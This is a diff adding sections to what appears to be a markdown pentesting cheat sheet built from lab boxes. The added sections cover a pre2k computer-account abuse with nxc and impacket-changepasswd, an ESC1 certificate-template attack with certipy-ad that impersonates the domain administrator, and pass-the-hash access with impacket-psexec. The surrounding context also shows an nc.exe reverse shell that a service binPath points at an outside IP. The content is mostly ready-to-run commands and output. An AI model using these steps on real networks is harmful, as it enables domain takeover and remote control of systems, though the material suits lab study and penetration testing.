@@ -60,6 +60,31 @@ or get a shell using Psexec
 PsExec64.exe \\TargetMachine cmd.exe  
 ```
 
+### pre2k
+
+- enum pre2k machines
+
+`nxc ldap retro.vl -u 'trainee' -p 'trainee' -M pre2k`
+
+```
+LDAP        10.129.2.242    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:retro.vl)
+LDAP        10.129.2.242    389    DC               [+] retro.vl\trainee:trainee
+PRE2K       10.129.2.242    389    DC               Pre-created computer account: BANKING$
+PRE2K       10.129.2.242    389    DC               [+] Found 1 pre-created computer accounts. Saved to /home/parallels/.nxc/modules/pre2k/retro.vl/precreated_computers.txt
+PRE2K       10.129.2.242    389    DC               [+] Successfully obtained TGT for banking@retro.vl
+PRE2K       10.129.2.242    389    DC               [+] Successfully obtained TGT for 1 pre-created computer accounts. Saved to /home/parallels/.nxc/modules/pre2k/ccache
+```
+
+- When the machine name is `BANKING$`, then the default password is `banking`
+
+- change the password
+
+`impacket-changepasswd 'retro.vl/BANKING$@10.129.234.44' -newpass 'Password1!' -p rpc-samr`
+
+- export the ccache file
+
+`export KRB5CCNAME=/home/parallels/.nxc/modules/pre2k/ccache/banking.ccache`
+
 ## AlwaysInstallElevated
 
 ![msi](/images/alwayselevated.png)
@@ -331,13 +356,13 @@ nxc ldap hutch.offsec -u '' -p '' --query "(sAMAccountName=*)" "" | grep descrip
 
 - make a user list
 
-```
+```bash
 ldapsearch -x -H ldap://10.129.234.71 -b "dc=baby,dc=vl" | grep -i samaccountname | cut -d ':' -f 2 |tr -d ' ' > users.txt
 ```
 
 - enum all properties
 
-```
+```bash
 ldapsearch -x -b "dc=baby,dc=vl" "*" -H ldap://BabyDC.baby.vl
 ```
 
@@ -517,3 +542,40 @@ or alternatively, in the step 3, execute nc.exe binary.
 ```
 sc.exe config VMTools binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.15.99 4444"
 ```
+
+## CERTIPY-AD
+
+- print out vulnerable certificate templates
+
+`certipy-ad find -username 'BANKING$' -password 'Password1!' -dc-ip 10.129.2.242 -vulnerable -enable -stdout`
+
+### ESC1
+
+[ESC1 certipy doc](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
+
+1. Enum the information of the target user
+
+`certipy-ad account -u 'BANKING$' -p 'Password1!' -dc-ip '10.129.2.242' -user 'administrator' read`
+
+2. Request a certificate
+
+`certipy-ad req -u 'BANKING$' -p 'Password1!' -dc-ip '10.129.2.242' -target 'DC.retro.vl' -ca 'retro-DC-CA' -template 'RetroClients' -upn 'administrator@retro.vl' -sid 'S-1-5-21-2983547755-698260136-4283918172-500'`
+
+- below error happens when the **key-size** is different
+
+```
+[-] Got error while requesting certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template.
+Would you like to save the private key? (y/N)
+```
+
+- in the case of key size error
+
+`certipy-ad -debug req -u 'BANKING$@retro.vl' -p 'Password1!' -dc-ip '10.129.2.242' -target 'DC.retro.vl' -ca 'retro-DC-CA' -template 'RetroClients' -upn 'administrator@retro.vl' -sid 'S-1-5-21-2983547755-698260136-4283918172-500' -key-size 4096`
+
+3. Authentication with the created certificate
+
+`certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.129.2.242'`
+
+4. Access with the created hash
+
+`impacket-psexec retro.vl/administrator@retro.vl -hashes :252fac7066d93dd009d4fd2cd0368389`
